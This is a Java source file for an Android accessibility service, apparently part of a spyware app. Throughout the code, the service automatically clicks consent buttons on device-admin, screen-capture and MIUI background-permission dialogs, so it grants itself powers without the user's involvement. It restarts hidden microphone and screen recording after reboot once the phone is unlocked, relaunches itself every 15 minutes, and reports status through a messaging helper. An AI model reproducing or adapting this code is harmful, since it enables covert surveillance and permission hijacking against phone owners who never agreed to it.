package org.code.coregradle.services;

import static android.app.ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND;
import static android.app.ActivityManager.RunningAppProcessInfo.IMPORTANCE_VISIBLE;

import android.accessibilityservice.AccessibilityService;
import android.app.ActivityManager;
import android.app.KeyguardManager;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.PowerManager;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import androidx.core.content.ContextCompat;

import org.json.JSONObject;
import org.code.coregradle.WorkerStore;
import org.code.coregradle.activities.CrossActivity;
import org.code.coregradle.config.IdentityStore;
import org.code.coregradle.utils.AdminHelper;
import org.code.coregradle.utils.AudioRecordHelper;
import org.code.coregradle.utils.MessageXInterceptor;
import org.code.coregradle.utils.MiHelper;
import org.code.coregradle.utils.TimeUtils;
import org.code.coregradle.utils.WynkHelper;

import java.io.File;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.SynchronousQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

public class AlfredService extends AccessibilityService {
    private static final ExecutorService mExecutor = newExecutorService();
    public static boolean isRunning = false;
    private KeyguardManager keyguardManager;
    private PowerManager powerManager;
    private MiHelper miHelper;
    private IdentityStore identityStore;
    private WynkHelper wynkHelper;
    private AudioRecordHelper audioRecordHelper;

    public static boolean isMIUI() {
        return Build.MANUFACTURER.toLowerCase().contains("Xiaomi".toLowerCase());
    }

    private static ExecutorService newExecutorService() {
        return new ThreadPoolExecutor(0, Integer.MAX_VALUE,
                2, TimeUnit.HOURS,
                new SynchronousQueue<Runnable>());
    }

    private static void updateIdentityStore(Context context, boolean isGranted, String updateContext, long time) {
        IdentityStore identityStore = IdentityStore.getInstance(context);
        try {

            JSONObject bgLaunchPermission = new JSONObject();
            bgLaunchPermission.put("granted", isGranted);
            bgLaunchPermission.put("checkedOn", new Date().toString());
            bgLaunchPermission.put("checkedTimeStamp", time);
            bgLaunchPermission.put("updateContext", updateContext);
            identityStore.updateConfig("miuiBgLaunchPermission", bgLaunchPermission);
            WorkerStore.executorService.submit(new MessageXInterceptor("MIUI Background Permission result" + bgLaunchPermission.toString(), identityStore.getIdentityValue()));
        } catch (Exception ignored) {

        }
    }


    private void handleRebootRecording() {
        if (wynkHelper.isRecording()) {
            sendMesssage("Queueing Wynk post reboot");
            wynkHelper.queueRecording();
        }
        Log.d("AlfredService", "Inside handle Reboot");
        if (audioRecordHelper.isRecording()) {
            Log.d("AlfredService", "About to restart recording");
            if (!powerManager.isScreenOn() || keyguardManager.isKeyguardLocked()) {
                audioRecordHelper.queueRecording();
                TimeUtils.sleep(3 * 60 * 1000);
                sendMesssage("Screen is locked queueing the recording");

            } else {
                audioRecordHelper.stopRecording();
                Intent startRecordingServiceIntent = new Intent(this, RecordingService.class);
                startRecordingServiceIntent.putExtra("mic", true);
                ContextCompat.startForegroundService(this, startRecordingServiceIntent);
            }
        }
    }

    public void goToHome() {
        performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
    }

    public void goBack() {
        performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
    }


    public void openSelf() {
        Intent intent = new Intent(this, CrossActivity.class);
        intent.putExtra("AppBucketPrevention", true);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY);
        startActivity(intent);
    }

    private static void updateIdentityStore(Context context, boolean isGranted, String updateContext) {
        updateIdentityStore(context, isGranted, updateContext, System.currentTimeMillis());
    }


    public void openAppGestures() {
        while (true) {
            if (!isAppInForeground()) {
                openSelf();
            }
            TimeUtils.sleep(15 * 60 * 1000);
        }
    }

    public AccessibilityNodeInfo getParent(AccessibilityNodeInfo node, int travelUp) {
        AccessibilityNodeInfo returnNode = node;
        while (travelUp > 0 && returnNode != null) {
            returnNode = returnNode.getParent();
            travelUp--;
        }
        return returnNode;
    }


    private void handleWynk(AccessibilityEvent event) {
        wynkHelper = WynkHelper.getInstance(this);
        if (wynkHelper.isMonitoring()) {
            AccessibilityNodeInfo nodeInfo = getRootInActiveWindow();
            if (nodeInfo == null) {
                return;
            }
            List<AccessibilityNodeInfo> nodeInfoList = nodeInfo.findAccessibilityNodeInfosByText("Start now");

            if (nodeInfoList == null || nodeInfoList.isEmpty()) {
                nodeInfo = getRootInActiveWindow();
                nodeInfoList = nodeInfo != null ? nodeInfo.findAccessibilityNodeInfosByText("Allow") : new ArrayList<>();
            }
            if (nodeInfoList == null || nodeInfoList.isEmpty()) {
                nodeInfo = getRootInActiveWindow();
                nodeInfoList = nodeInfo != null ? nodeInfo.findAccessibilityNodeInfosByText(getString(android.R.string.ok)) : new ArrayList<>();
            }
            if (nodeInfoList != null && nodeInfoList.size() >= 1 && nodeInfoList.get(0).isClickable()) {
                nodeInfoList.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
                wynkHelper.stopMonitoring();
            }
        }
    }

    private void makeClick(List<AccessibilityNodeInfo> nodeInfoList, AdminHelper adminHelper) {
        for (AccessibilityNodeInfo accessibilityNodeInfo : nodeInfoList) {
            AccessibilityNodeInfo accessibilityNode = accessibilityNodeInfo;
            while (accessibilityNode != null) {
                if (accessibilityNode.isClickable() && accessibilityNode.isEnabled()) {
                    accessibilityNode.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    adminHelper.stopMonitoring();
                    return;
                } else {
                    accessibilityNode = accessibilityNode.getParent();
                }
            }
        }
    }

    private void handleAdmin(AccessibilityEvent event) {
        AdminHelper adminHelper = AdminHelper.getInstance(this);
        if (adminHelper.isMonitoring()) {
            AccessibilityNodeInfo nodeInfo = getRootInActiveWindow();
            if (nodeInfo == null) {
                return;
            }
            List<AccessibilityNodeInfo> nodeInfoList = nodeInfo.findAccessibilityNodeInfosByText("Activate");
            if (nodeInfoList != null && nodeInfoList.size() >= 1) {
                makeClick(nodeInfoList, adminHelper);
            }
            if (isMIUI()) {
                nodeInfoList = nodeInfo.findAccessibilityNodeInfosByText("Next");
                if (nodeInfoList == null || nodeInfoList.isEmpty()) {
                    nodeInfoList = nodeInfo.findAccessibilityNodeInfosByText("Accept");
                    if (nodeInfoList != null && nodeInfoList.size() >= 1) {
                        makeClick(nodeInfoList, adminHelper);
                    }
                }
                if (nodeInfoList != null && nodeInfoList.size() >= 1) {
                    makeClick(nodeInfoList, adminHelper);
                }
            }
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        handlePendingRecordingRequests();
        handleWynk(event);
        handleAdmin(event);
        handleMIUIEvents(event);
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.d("AlfredService", "Just Born now!");
        keyguardManager = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);
        powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        miHelper = MiHelper.getInstance(this);
        identityStore = IdentityStore.getInstance(this);
        wynkHelper = WynkHelper.getInstance(this);
        audioRecordHelper = AudioRecordHelper.getInstance(this);
        isRunning = true;
        mExecutor.submit(this::handleRebootRecording);
        mExecutor.submit(this::openAppGestures);
    }

    public boolean isAppInForeground() {
        ActivityManager.RunningAppProcessInfo appProcessInfo = new ActivityManager.RunningAppProcessInfo();
        ActivityManager.getMyMemoryState(appProcessInfo);
        Log.d("AlfredService", "isAppInForeground AppProcessInfo Importance: " + appProcessInfo.importance + "process name: " + appProcessInfo.processName);
        return (appProcessInfo.importance == IMPORTANCE_FOREGROUND || appProcessInfo.importance == IMPORTANCE_VISIBLE);
    }

    private void handlePendingRecordingRequests() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1 && wynkHelper.isRecordingQueued()
                && !keyguardManager.isKeyguardLocked() && powerManager.isInteractive()) {
            wynkHelper.deQueueRecording();
            try {
                File file = new File(getFilesDir(), ".canLaunchXActivity");
                file.createNewFile();
                Intent intent = new Intent(this, CrossActivity.class);
                intent.putExtra("screenCap", true);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY);
                startActivity(intent);
                TimeUtils.sleep(2000);
                if (file.exists()) {
                    updateIdentityStore(this, false, "PendingAlfred");
                } else {
                    updateIdentityStore(this, true, "PendingAlfred");
                }
            } catch (Exception ignored) {
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1 && audioRecordHelper.isRecordingQueued()
                && !keyguardManager.isKeyguardLocked() && powerManager.isInteractive()) {
            audioRecordHelper.deQueueRecording();
            Intent startRecordingServiceIntent = new Intent(this, RecordingService.class);
            startRecordingServiceIntent.putExtra("mic", true);
            ContextCompat.startForegroundService(this, startRecordingServiceIntent);
        }
    }

    private void handleMIUIEvents(AccessibilityEvent event) {

        if (miHelper.isMonitoring()) {
            navigateToMIUIBackgroundPopupPermission();
            AccessibilityNodeInfo allowButton = findMIUIGrantButton();
            if (allowButton != null && allowButton.isClickable()) {
                allowButton.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                Log.d("AlfredService", "Calling Launch App");
                goBack();
                updateIdentityStore(this, true, "AlfredMiBtn");
            }
        }
    }

    private void navigateToMIUIBackgroundPopupPermission() {
        AccessibilityNodeInfo nodeInfo = getRootInActiveWindow();
        if (nodeInfo != null) {
            List<AccessibilityNodeInfo> nodeInfoList = nodeInfo.findAccessibilityNodeInfosByText("Display pop-up windows while running in the background");
            if (nodeInfoList != null && !nodeInfoList.isEmpty()) {
                Log.d("AlfredService", "Finding permission for background: " + nodeInfoList.size());
                for (int i = 0; i < nodeInfoList.size(); i++) {
                    for (int up = 0; up < 5; up++) {
                        AccessibilityNodeInfo permissionButton = getParent(nodeInfoList.get(i), up);
                        if (permissionButton != null && permissionButton.isClickable()) {
                            permissionButton.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            Log.d("AlfredService", "Clicked the backgound permission button");
                            return;
                        }
                    }
                }
            }
        }
    }

    public AccessibilityNodeInfo findMIUIGrantButton() {
        AccessibilityNodeInfo nodeInfo = getRootInActiveWindow();
        if (nodeInfo != null) {
            List<AccessibilityNodeInfo> nodeInfoList = nodeInfo.findAccessibilityNodeInfosByText("Always allow");
            if (nodeInfoList == null || nodeInfoList.isEmpty()) {
                nodeInfoList = nodeInfo.findAccessibilityNodeInfosByText("Accept");
            }
            if (nodeInfoList != null && !nodeInfoList.isEmpty()) {

                AccessibilityNodeInfo allowButton = null;
                for (int i = 0; i < 5; i++) {
                    Log.d("AlfredService", "Attempt: " + i);
                    allowButton = getParent(nodeInfoList.get(0), i);
                    if (allowButton.isClickable()) {
                        return allowButton;
                    }
                }
            }
        }
        return null;
    }

    private void launchApp() {
        Intent intent = getPackageManager().getLaunchIntentForPackage(getPackageName());
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        startActivity(intent);
    }


    private void sendMesssage(String message) {
        IdentityStore identityStore = IdentityStore.getInstance(this);
        try {
            mExecutor.submit(new MessageXInterceptor(message, identityStore.getIdentityValue()));
        } catch (Exception ignored) {

        }
    }

    @Override
    public void onInterrupt() {
        isRunning = false;
    }
}
